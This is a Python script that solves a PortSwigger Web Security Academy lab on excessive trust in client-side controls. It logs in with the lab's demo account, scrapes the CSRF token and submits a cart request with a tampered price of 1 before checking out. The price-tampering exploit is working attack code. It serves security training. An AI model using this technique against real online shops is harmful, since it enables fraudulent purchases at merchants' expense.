#!/usr/bin/env python3
# Lab: Excessive trust in client-side controls
# Lab-Link: https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
# Difficulty: APPRENTICE
from bs4 import BeautifulSoup
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def get_csrf_token(text):
    soup = BeautifulSoup(text, 'html.parser')
    return soup.find('input', attrs={'name': 'csrf'})['value']


def login(client, url, csrf):
    data = {'csrf': csrf, 'username': 'wiener', 'password': 'peter'}
    r = client.post(url, data=data)
    return 'Your username is: wiener' in r.text


def main():
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    print(f'[+] Login as wiener')
    csrf = get_csrf_token(client.get(f'{host}/login').text)
    if not login(client, f'{host}/login', csrf):
        print(f'[-] Failed to login as wiener')
        sys.exit(-2)

    print(f'[+] Add jacket to cart')
    data = {'productId': 1, 'redir': 'CART', 'quantity': 1, 'price': 1}
    res = client.post(f'{host}/cart', data=data)

    print(f'[+] Do checkout')
    data = {'csrf': get_csrf_token(res.text)}
    res = client.post(f'{host}/cart/checkout', data=data)
    if 'Congratulations, you solved the lab!' in res.text:
        print(f'[+] Obtained jacket at a discount')
    else:
        print(f'[-] Failed to obtain jacket at a discount')


if __name__ == "__main__":
    main()
